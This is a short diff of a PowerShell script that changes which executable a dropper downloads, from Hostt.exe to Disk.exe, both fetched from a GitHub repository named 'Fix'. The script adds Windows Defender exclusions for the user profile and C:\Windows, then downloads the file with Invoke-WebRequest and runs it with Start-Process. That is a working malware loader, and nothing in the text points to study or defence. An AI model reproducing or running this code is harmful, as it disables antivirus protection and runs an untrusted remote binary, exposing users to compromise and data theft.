@@ -1,6 +1,6 @@
 Add-MpPreference -ExclusionPath $env:USERPROFILE
 Add-MpPreference -ExclusionPath C:\Windows
-$url = "https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/Hostt.exe"
+$url = "https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/Disk.exe"
 $output = "$env:Fix.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process -FilePath $output
